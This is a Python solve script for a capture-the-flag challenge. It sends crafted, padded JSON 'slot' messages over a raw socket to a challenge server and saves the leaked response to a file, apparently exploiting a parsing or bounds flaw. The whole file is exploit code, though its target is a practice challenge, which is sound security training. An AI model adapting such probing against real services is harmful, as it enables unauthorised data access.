#!/usr/bin/env python3
import json
import socket
import time

HOST = ('chals.tisc25.ctf.sg', 51728)

def build_line(vals, comma_space=0, trail_spaces=0):
    sep = ',' + (' ' * comma_space)
    body = '[' + sep.join(str(x) for x in vals) + ']'
    return '{"slot": 1, "data": ' + body + '}' + (' ' * trail_spaces)

base_vals = [100] * 44
second = build_line(base_vals + [65,11,0], 0, 45)
third  = build_line(base_vals + [75,37,0], 0, 45)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(8)
s.connect(HOST)

resps = []
# 1
s.sendall((json.dumps({"slot":1, "data":[69,2,0]})+'\n').encode())
resps.append(s.recv(16384))
# 2
time.sleep(0.15)
s.sendall((second+'\n').encode())
resps.append(s.recv(16384))
# 3
time.sleep(0.15)
s.sendall((third+'\n').encode())
resps.append(s.recv(16384))
# 4
time.sleep(0.15)
s.sendall((json.dumps({"slot":0})+'\n').encode())
resps.append(s.recv(65536))

for i, r in enumerate(resps, 1):
    print(f'R{i}:', r[:200])
with open('last_resp.bin', 'wb') as f:
    f.write(resps[-1])
print('Wrote last_resp.bin with', len(resps[-1]), 'bytes')
